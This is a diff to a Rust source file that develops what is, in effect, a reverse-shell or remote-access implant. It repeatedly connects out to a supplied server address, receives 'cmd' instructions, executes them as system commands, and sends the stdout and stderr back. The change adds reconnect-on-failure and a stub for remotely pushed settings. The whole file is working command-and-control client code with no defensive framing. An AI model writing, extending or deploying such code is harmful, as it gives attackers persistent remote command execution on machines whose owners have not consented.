@@ -1,62 +1,43 @@
 use std::io::Write;
 use std::net::TcpStream;
-use std::process::{Command, Output};
+use std::process::Command;
 use std::{io, thread, time};
 
 pub fn run(full_address: &str) {
-    let duration = time::Duration::from_secs(2);
+    let mut duration = time::Duration::from_secs(2);
     loop {
         thread::sleep(duration);
         println!("Connecting to server at {}", full_address);
-        let stream = TcpStream::connect(full_address).expect("Failed to connect to server");
+        let stream = TcpStream::connect(full_address);
 
-        handle_stream(stream);
+        match stream {
+            Ok(stream) => {
+                println!("Connected to server at {}", full_address);
+                let _ = handle_stream(stream);
+            }
+            Err(_) => {
+                println!("Failed to connect to server at {}", full_address);
+                continue;
+            }
+        }
     }
 }
 
-fn handle_stream(mut stream: TcpStream) {
-    let mut command = parse_stream(&stream);
-    let output = command.output();
+fn handle_stream(mut stream: TcpStream) -> Result<(), io::Error> {
+    let instruction = parse_stream(&stream);
 
-    send_command_feedback(&mut stream, &output).unwrap_or_else(|err| {
-        //todo : when this happen, store message, then retry later on.
-        println!("Failed to send command feedback: {}", err);
-    });
-}
-
-fn send_command_feedback(
-    stream: &mut TcpStream,
-    command_output: &Result<Output, io::Error>,
-) -> Result<(), io::Error> {
-    match command_output {
+    match instruction.execute() {
         Ok(output) => {
-            send_output(stream, &output)?;
+            output.send_feedback(&mut stream)?;
         }
-        Err(err) => {
-            send_error(stream, &err)?;
+        Err(_err) => {
+            //Error while executing instruction
         }
     }
     Ok(())
 }
 
-fn send_error(stream: &mut TcpStream, error: &io::Error) -> Result<(), io::Error> {
-    let message = format!("{}\n", error);
-    stream.write(&message.as_bytes())?;
-    Ok(())
-}
-
-fn send_output(stream: &mut TcpStream, output: &Output) -> Result<(), io::Error> {
-    let message = format!(
-        "\n{}\n{}\n",
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr)
-    );
-
-    stream.write(&message.as_bytes())?;
-    Ok(())
-}
-
-fn parse_stream(stream: &TcpStream) -> Command {
+fn parse_stream(stream: &TcpStream) -> Box<dyn Executable> {
     let mut buffer = [0; 1024];
     stream
         .peek(&mut buffer)
@@ -64,10 +45,9 @@ fn parse_stream(stream: &TcpStream) -> Command {
 
     let input = String::from_utf8_lossy(&buffer[..]);
     let input = input.trim_matches(char::from(0));
+    println!("Received command: {}", input);
 
-    let command = parse_command(&input);
-
-    command
+    instruction_factory(input)
 }
 
 fn parse_command(command: &str) -> Command {
@@ -93,6 +73,78 @@ fn parse_command(command: &str) -> Command {
     }
 
     cmd
+}
+
+struct InstructionOutput {
+    output: String,
+}
+impl InstructionOutput {
+    fn send_feedback(&self, stream: &mut TcpStream) -> Result<(), io::Error> {
+        stream.write(&self.output.as_bytes())?;
+        Ok(())
+    }
+}
+trait Executable {
+    fn execute(&self) -> Result<InstructionOutput, io::Error>;
+}
+
+struct ReceivedCommand {
+    command: String,
+}
+
+impl ReceivedCommand {
+    fn from_string(command: String) -> Self {
+        ReceivedCommand { command }
+    }
+}
+
+impl Executable for ReceivedCommand {
+    fn execute(&self) -> Result<InstructionOutput, std::io::Error> {
+        let mut command = parse_command(&self.command);
+        let output = command.output();
+
+        match output {
+            Ok(output) => Ok(InstructionOutput {
+                output: format!(
+                    "\n{}\n{}\n",
+                    String::from_utf8_lossy(&output.stdout),
+                    String::from_utf8_lossy(&output.stderr)
+                ),
+            }),
+            Err(err) => Ok(InstructionOutput {
+                output: format!("{}\n", err),
+            }),
+        }
+    }
+}
+
+struct ReceivedSetting {
+    key: String,
+    value: String,
+}
+
+impl ReceivedSetting {
+    fn from_string(key: String, value: String) -> Self {
+        ReceivedSetting { key, value }
+    }
+}
+
+impl Executable for ReceivedSetting {
+    fn execute(&self) -> Result<InstructionOutput, io::Error> {
+        todo!("when settings are available implement thier execution");
+    }
+}
+
+fn instruction_factory(instruction: &str) -> Box<dyn Executable> {
+    let parts: Vec<&str> = instruction.split_whitespace().collect();
+    match parts[0] {
+        "cmd" => Box::new(ReceivedCommand::from_string(parts[1..].join(" "))),
+        "set" => Box::new(ReceivedSetting::from_string(
+            parts[1].to_string(),
+            parts[2].to_string(),
+        )),
+        _ => Box::new(ReceivedCommand::from_string("".to_string())),
+    }
 }
 
 #[cfg(test)]
